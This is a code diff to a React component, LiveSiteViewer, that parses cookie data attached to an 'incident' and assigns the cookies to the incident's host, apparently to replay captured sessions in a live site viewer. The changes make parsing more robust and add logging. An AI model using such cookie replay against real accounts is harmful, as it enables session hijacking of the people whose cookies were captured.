@@ -26,8 +26,11 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
   const [currentUrl, setCurrentUrl] = useState<string | null>(null);
 
   useEffect(() => {
-    // Try to get cookies from full_cookie_data, cookie_data, or cookie_excerpt
-    const cookieSource = incident.full_cookie_data || incident.cookie_data || (incident as any).cookie_excerpt;
+    // Try to get cookies from multiple sources (both snake_case and camelCase)
+    const cookieSource = incident.full_cookie_data 
+      || incident.cookie_data 
+      || (incident as any).cookie_excerpt 
+      || (incident as any).cookieExcerpt;
     
     if (cookieSource) {
       try {
@@ -48,7 +51,7 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
                   domain: incident.host,
                   path: '/'
                 };
-              }).filter(c => c.name);
+              }).filter(c => c.name && c.value);
             }
           }
         } else {
@@ -59,29 +62,36 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
         let cookieArray = [];
         
         if (Array.isArray(parsedData)) {
-          // Already in array format
-          cookieArray = parsedData.map(c => ({
-            ...c,
-            domain: c.domain || incident.host,
-            path: c.path || '/'
-          }));
+          // Already in array format - filter out invalid entries
+          cookieArray = parsedData
+            .filter(c => c && typeof c === 'object' && c.name && c.value && c._type !== 'undefined')
+            .map(c => ({
+              ...c,
+              domain: c.domain || incident.host,
+              path: c.path || '/'
+            }));
         } else if (parsedData && typeof parsedData === 'object') {
           // Convert object format {name: value} to array format
-          cookieArray = Object.entries(parsedData).map(([name, value]) => ({
-            name,
-            value: String(value),
-            domain: incident.host,
-            path: '/'
-          }));
+          cookieArray = Object.entries(parsedData)
+            .filter(([name, value]) => name && value && value !== 'undefined')
+            .map(([name, value]) => ({
+              name,
+              value: String(value),
+              domain: incident.host,
+              path: '/'
+            }));
         }
         
+        console.log('[LiveSiteViewer] Parsed cookies:', cookieArray.length, 'cookies');
         setCookies(cookieArray);
       } catch (error) {
         console.error('Error parsing cookie data:', error);
         setCookies([]);
       }
+    } else {
+      setCookies([]);
     }
-  }, [incident.full_cookie_data, incident.cookie_data, (incident as any).cookie_excerpt, incident.host]);
+  }, [incident.full_cookie_data, incident.cookie_data, (incident as any).cookie_excerpt, (incident as any).cookieExcerpt, incident.host]);
 
   // Listen for navigation messages from iframe
   useEffect(() => {
